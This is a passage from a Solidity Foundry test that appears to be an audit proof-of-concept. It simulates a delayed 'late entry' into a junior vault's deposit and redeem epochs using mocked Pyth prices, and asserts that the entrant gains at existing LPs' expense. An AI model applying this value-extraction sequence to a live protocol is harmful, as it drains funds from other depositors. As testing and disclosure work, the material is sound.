        assertEq(claimableAssets, CHARLIE_LP_CAPITAL, "all queued Charlie assets activate");
        vm.prank(CHARLIE);
        shares = juniorVault.claimDeposit(requestId, claimableAssets, CHARLIE, CHARLIE);
    }
    function _redeemCharlie(uint64 confidence, Metrics memory m) internal {
        uint256 shares = juniorVault.balanceOf(CHARLIE);
        if (shares == 0) return;
        uint256 cooldownEnd = juniorVault.lastDepositTime(CHARLIE) + 1 hours;
        if (block.timestamp < cooldownEnd) vm.warp(cooldownEnd);
        vm.prank(CHARLIE);
        uint256 requestId = juniorVault.requestRedeem(shares, CHARLIE, CHARLIE);
        m.charlieRedeemRequestedShares = shares;
        uint256 activation = juniorVault.depositEpochStart(requestId);
        if (block.timestamp < activation) vm.warp(activation);
        router.settleLpEpoch(_nextPythUpdate(confidence));
        uint256 fundedShares = juniorVault.claimableRedeemRequest(requestId, CHARLIE);
        uint256 claimableAssets = juniorVault.claimableRedeemAssets(requestId, CHARLIE);
        m.charlieRedeemFundedShares = fundedShares;
        m.charlieRedeemUnfundedShares = shares - fundedShares;
        if (fundedShares > 0) {
            uint256 beforeAssets = settlementToken.balanceOf(CHARLIE);
            vm.prank(CHARLIE);
            juniorVault.claimRedeem(requestId, fundedShares, CHARLIE, CHARLIE);
            m.charlieRedeemPaid = settlementToken.balanceOf(CHARLIE) - beforeAssets;
            assertEq(m.charlieRedeemPaid, claimableAssets, "funded redemption amount is actually paid");
        }
    }
    function _nextPythUpdate(uint64 confidence) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        uint64 publishTime = uint64(block.timestamp + 1);
        vm.warp(publishTime);
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(100_000_000), confidence, int32(-8), publishTime, publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = "";
    }
    function _assertDelayedEntryDifferential(uint64 confidence) internal {
        uint256 snapshot = vm.snapshotState();
        Metrics memory noEntry = _runSequence(Sequence.NoEntry, confidence);
        assertTrue(vm.revertToStateAndDelete(snapshot), "restore same production fixture for matched control");
        Metrics memory delayedEntry = _runSequence(Sequence.DelayedEntry, confidence);
        int256 charlieUplift = int256(delayedEntry.charlieEndWealth) - int256(noEntry.charlieEndWealth);
        uint256 oldLpCounterfactualLoss = noEntry.oldLpAssetsFinal - delayedEntry.oldLpAssetsFinal;
        emit log_named_uint("hyp22.differential_confidence_raw", confidence);
        emit log_named_int("hyp22.differential_charlie_uplift", charlieUplift);
        emit log_named_uint("hyp22.differential_old_lp_counterfactual_loss", oldLpCounterfactualLoss);
        assertGt(delayedEntry.charlieEndWealth, delayedEntry.charlieStartWealth, "late entrant exits with local net gain");
        assertGt(charlieUplift, 0, "late entry improves Charlie wealth against no-entry control");
        assertGt(oldLpCounterfactualLoss, 0, "late entry reduces old LP value against matched control");
        assertApproxEqAbs(
            uint256(charlieUplift), oldLpCounterfactualLoss, 100_000, "Charlie uplift reconciles to pre-existing LP loss"
        );
    }
}
```
